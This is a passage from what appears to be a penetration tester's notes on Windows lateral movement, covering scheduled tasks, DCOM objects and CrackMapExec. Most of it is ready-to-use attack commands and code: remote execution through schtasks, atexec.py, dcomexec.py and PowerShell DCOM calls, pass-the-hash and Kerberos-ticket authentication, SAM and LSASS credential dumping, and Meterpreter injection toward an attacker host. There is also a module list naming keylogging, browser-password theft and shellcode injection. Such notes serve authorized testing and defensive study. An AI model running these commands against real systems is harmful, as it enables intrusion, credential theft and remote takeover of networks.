          -> (Optional, to run as NT AUTHORITY\SYSTEM) Change User or Group... -> SYSTEM

  Actions -> New... -> Program/script: <cmd.exe | %ComSpec% | powershell.exe | BINARY>
          -> Add arguments (optional): <COMMAND_ARGS>

  Conditions -> Power -> Start the task only if the computer is on AC power -> Unchecked

Task Scheduler Library -> Right click on <TASK> -> Run / Delete  
```

```
# <TASK_COMMAND> example with the Windows built-in cmd.exe or PowerShell:
cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>'
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>'
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD>
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc <ENCODED_BASE64_CMD>

# Create a scheduled task to run PowerShell code for example
schtasks /create /tn "<TASK_NAME>" /tr "<TASK_COMMAND>" /sc once /sd <MM/DD/YYYY> /st <HH:MM:SS> /V1 /Z /RU "NT AUTHORITY\SYSTEM" /S <IP | HOSTNAME>

# The creation and status of the scheduled task can be validated
schtasks /query /tn "<TASK_NAME>" /S <IP | HOSTNAME>
schtasks /run /tn "<TASK_NAME>" /S <IP | HOSTNAME>
schtasks /delete /tn "<TASK_NAME>" /S <IP | HOSTNAME>

# By default, atexec execute "cmd /C <COMMAND>"
# NTLM authentication
atexec.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <TASK_COMMAND>
atexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <TASK_COMMAND>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
atexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> "<COMMAND | TASK_COMMAND>"
```

###### Distributed Component Object Model (DCOM)

`Component Object Model (COM)` is a Microsoft standard for inter-process
communication. `COM` specifies an object model and programming requirements
that enable `COM objects` (also called `COM components`) to interact with one
another. A `COM object` defines one, or more, sets of functions (`methods`),
called `interfaces`, that are the only way to manipulate the data associated
with the object. A `COM server` object provides services to `COM clients`
through its implemented `methods`, called by the clients after retrieving a
pointer to the `COM server` object interface.   

The proprietary Microsoft `Distributed Component Object Model (DCOM)`
technology allows for networked communication of `COM objects` over the
`Microsoft Remote Procedure Call (MSRPC)` protocol, with a first connection
initiated on the remote system port TCP 135.  

The `COM` / `DCOM` object register a few notable identifiers:
  - The `Class Identifier (CLSID)`, a `GUID` acting as a unique identifier for
  every `COM class` registered in Windows. The `CLSID key` in the registry
  points to the implementation of the class.
  - The optional `Programmatic Identifier (ProgID)`, that can supplement a
  `COM class` `CLSID` with a more human-readable name. Not every `COM class`
  is associated with a `ProgID`.
  - The `Application Identifier (AppID)`, which groups the configuration for
  one, or more, `DCOM objects` hosted by the same executable into one
  centralized location in the registry (`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\
  AppID\{<APPID>}`).

The configuration defined in `AppID` notably specify, the form of `Access
Control List (ACL)`, the following permissions:
   - `Launch Permissions`, that restrict the security principals that can
   locally or remotely start the `DCOM object` server
   - `Access Permissions`, that restrict the security principals that can
   locally or remotely access the `DCOM object` methods
   - `Configuration Permissions`, that restrict the security principals that
   can modify the configuration of the `DCOM` objects.

System-wide limits are defined and control the minimal level of restrictions
`DCOM applications` can set. By default, `Everyone` and non authenticated
users (`ANONYMOUS LOGON`) may be granted local or remote access to `DCOM
object` methods while only members of the local `Administrators`, `Distributed
COM Users`, and `Performance Log Users` may be granted remote `launch` and
`activation` rights.

If the `Access Permissions` is left unspecified in the `AppID` configuration,
the system-wide `Access Permissions` and `Launch Permissions` are applied. By
default, the `Remote Access` right is only granted to the Windows local
built-in `Administrators` group. The `AppID` registered on a system can be
browsed and edited using the `dcomcnfg.exe` Windows built-in utility or, the
dedicated `OleViewDotNet` .NET utility.

A client request the instantiation of a remote `DCOM` object class by
specifying its `CLSID` or `ProgID`, the later being resolved to the associated
`CLSID`. The `DCOMLaunch` service (`C:\Windows\system32\svchost.exe -k
DcomLaunch`, for `DCOM objects` from an `exe` binary) or `DLLHOST.exe` (for
`DCOM objects` from a `DLL`) then instantiate the requested `DCOM` object
class, on condition that the client has the necessary access permissions (as
defined in the `APPID` configuration). The error code `80070005` (for
`E_ACCESSDENIED`) will be returned otherwise.

PowerShell can be used to list the `CLSID` and `ProdID` properties of the
`DCOM objects` registered on the local computer `HKEY_CLASSES_ROOT` registry
hive. The `HKEY_CLASSES_ROOT` registry hive cannot be directly accessed on a
remote computer using `Get-ChildItem`. In order to remotely access the
`HKEY_CLASSES_ROOT` registry hive, the following PowerShell commands can be
run over `WinRM` using the `Invoke-Command` PowerShell cmdlet.  

```
# Lists
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID | ForEach-Object {

  $DCOMClass = New-Object PSObject -Property @{
    CLSID = $_.Name.Split("{")[1].Split("}")[0]
  }

  If ($_.GetSubKeyNames() -match "ProgID") {
    $DCOMClass | Add-Member -Type NoteProperty -Name "ProgID" -Value $_.OpenSubKey("ProgID").GetValue("")
  }

  Else {
    $DCOMClass | Add-Member -Type NoteProperty -Name "ProgID" -Value $null
  }

  return $DCOMClass
}

# Filters by ProgID
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -Recurse -Include 'ProgID' | ForEach-Object { If ($_.GetValue("") -match "<PROGID>") { return $_.Name,$_.GetValue("") }}

# Filter by CLSID
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -Recurse | ForEach-Object { If ($_.Name -match "<CLSID>") { return $_.Name,$_.GetValue("") }}
```

Multiple `DCOM objects` classes can be leveraged to execute commands on the
remote system. The idea of using `DCOM objects` for lateral movements having
come to light recently, in January 2017 after a publication by `enigma0x3`, the
below list, mostly gathered from
`https://www.cybereason.com/blog/dcom-lateral-movement-techniques`, is possibly
far from being exhaustive.

PowerShell and `Impacket`'s `dcomexec.py` Python script can be used to execute
commands through `DCOM` objects:

```
# PowerShell
# MMC20.Application
# Blocked by the default Windows firewall rules
# Starts a child process under Microsoft Management Console (mmc.exe)
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("<C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | BINARY>", $null, <$null | "COMMAND_ARGS">, "7")

# ShellWindows
# Blocked by the default Windows firewall rules
# Requires a File Explorer or Internet Explorer process on the remote system
$dcom = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "<IP¨>"))
$dcom[0].Document.Application.ShellExecute("<BINARY>")
$dcom[0].Document.Application.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# ShellBrowserWindow
# Blocked by the default Windows firewall rules
# DOES NOT require a File Explorer or Internet Explorer process on the remote system
# Only available on
$dcom = [activator]::CreateInstance([type]::GetTypeFromCLSID("c08afd90-f2a1-11d1-8455-00a0c91f3880", "<IP¨>"))
$dcom.Document.Application.ShellExecute("<BINARY>")
$dcom.Document.Application.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# Outlook through Shell.Application
# Blocked by the default Windows firewall rules?
# Requires Outlook to be installed on the remote system
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "<IP¨>"))
$dcom_shell = $dcom.CreateObject("Shell.Application")
$dcom_shell.ShellExecute("<BINARY>")
$dcom_shell.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# Excel.Application DDE
# Blocked by the default Windows firewall rules?
# Requires Excel to be installed on the remote system
# The name of the specified binary is limited to 8 characters maximum, so a binary present in the %PATH%, such as powershell.exe or cmd.exe, must be used
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","<IP>"))
$dcom.DisplayAlert = $False
$dcom.DDEInitiate("<BINARY>","<COMMAND_ARGS>")

# Python
# dcomexec.py executes by default a semi-interactive shell using the ShellBrowserWindow DCOM oject.
# NTLM authentication
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <TASK_COMMAND>
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <TASK_COMMAND>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> "<COMMAND | TASK_COMMAND>"

# More Microsoft Office DCOM objects can be leveraged for lateral movements, as described in the provided source above
```

###### [Over SMB / WMI / DCOM / WinRM / MSSQL / SSH] CrackMapExec

`CrackMapExec` is a "Swiss army knife for pentesting Windows / Active Directory
environments" that wraps around multiples `Impacket` modules.

`CrackMapExec` can be used to test credentials and execute commands through
`SMB`, `WinRM`, `MSSQL`, `SSH`, `HTTP` services.

Over `SMB`, `CrackMapExec` supports different command execution methods:
  - (Default) `wmiexec` executes commands via `WMI`
  - `smbexec` executes commands by creating and running a service, similarly to
  the `PsExec` utility
  - `atexec` executes commands by remotely scheduling a task with through the
  Windows task scheduler
  - `mmcexec` executes commands over the `MMC20.Application` `DCOM` object

`CrackMapExec` additionally supports authentication with `Kerberos` tickets
(specified in the `KRB5CCNAME` environment variable) on Linux operating
systems.

*CrackMapExec installation*

`CrackMapExec` requires various Python dependencies (sometimes in specific
version), making its installation somewhat challenging at times.

`CrackMapExec` pre-compiled binaries for Linux and Windows (that still require
`Python3` to be installed on the system) can be downloaded on the
[CrackMapExec's GitHub repository's
"Actions"](https://github.com/byt3bl33d3r/CrackMapExec/actions). Fully
standalone binaries for Linux and Windows can be retrieved in the
[OffensivePythonPipeline](https://github.com/Qazeer/OffensivePythonPipeline).

For more information on `CrackMapExec`'s installation refer to the [official
documentation](https://mpgn.gitbook.io/crackmapexec/getting-started/installation).

```bash
# As of March 2021, the crackmapexec package of the Kali Linux distribution is up to date and can be used to easily install CrackMapExec.
apt install crackmapexec

# Installation using Docker.
docker pull byt3bl33d3r/crackmapexec
docker run byt3bl33d3r/crackmapexec:latest [...]
```

*CrackMapExec usage*

```bash
# As of December 2018, crackmapexec does not provides an option to output to a file.
# The tee utility can be used to both display and store to a file the crackmapexec standard output.
# crackmapexec <[...]> | tee <OUTPUT_FILE>

# <TARGET | TARGETS> - can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of targets.
crackmapexec <smb | winrm | ssh | mssql | http> <TARGET | TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]

# Kerberos authentication on Linux systems. The targets must be fully qualified hostnames (and not IP addresses) for the Kerberos authentication to work.
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
crackmapexec smb <TARGET | TARGETS> --kerberos [...]
```

Additionally, `CrackMapExec` includes multiples modules that can be used for
post-exploitation:

```
crackmapexec smb --list-modules

[*] Get-ComputerDetails       Enumerates sysinfo
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers' machine
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] netripper                 Capture's credentials by using API hooking
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] rdp                       Enables/Disables RDP
[*] rid_hijack                Executes the RID hijacking persistence hook.
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] wireless                  Get key of all wireless interfaces
```

`CrackMapExec` notable modules usage:

```
# SAM dump.
crackmapexec smb <TARGET | TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump using lsassy.
crackmapexec smb <TARGET | TARGETS> -M lsassy (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
# Outdated LSASS dump technique using mimikatz that is flagged by most antivirus products.
crackmapexec smb <TARGET | TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# Meterpreter.
# msf > use multi/handler
# msf exploit(handler) > set payload windows/meterpreter/reverse_https
crackmapexec smb <TARGET | TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

For more information on how to remotely extract credentials from the `SAM`
registry hive and the `LSASS` process, refer to the `[Windows] Post
exploitation` note.

Note that:
  - The `--lsa` option dumps LSA secrets which can't be used in `Pass-the-Hash`
    attack and are harder to crack.
  - The `<TARGET>` and `<MODULE>` should be specified before the credentials as
    a `CrackMapExec` bug could skip the targets / module otherwise.
  - If the targeted host is unreachable, `CrackMapExec` may exit with out
    returning any error message.
  - In case the metinject fails, a local administrator can be added for RDP
    access or a powershell reverse shell injected in memory instead (refer to
    the `[General] Shells - PowerShell` note).
  - If a `permission denied` error is raised upon first execution of
    `crackmapexec` on a Linux system, necessary rights to create new files in
    the user's `HOME` folder may be missing. A temporary alternative `HOME`
    folder can be specified for `crackmapexec` execution: `HOME=<PATH>
    crackmapexec [...]`.

--------------------------------------------------------------------------------

### References

https://ss64.com/nt/sc.html
https://support.microsoft.com/en-us/help/251192/how-to-create-a-windows-service-by-using-sc-exe
https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec
https://docs.microsoft.com/fr-fr/windows/win32/winrm/portal
https://docs.microsoft.com/fr-fr/windows/win32/wmisdk/wmi-start-page
https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
https://blog.cobaltstrike.com/2017/05/23/cobalt-strike-3-8-whos-your-daddy/
https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/
https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/
https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens
http://woshub.com/powershell-remoting-via-winrm-for-non-admin-users/
https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
https://www.cybereason.com/blog/dcom-lateral-movement-techniques
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/ba4c4d80-ef81-49b4-848f-9714d72b5c01
https://blog.varonis.fr/dcom-technologie-distributed-component-object-model/
https://gallery.technet.microsoft.com/scriptcenter/89a5e3c2-0a1c-4471-b78c-136606cafdfb
https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/
Applied Incident Response, Steve Anson
https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netshareadd
https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
Mitigating-Pass-the-Hash-Attacks-and-Other-Credential-Theft-Version-2.pdf
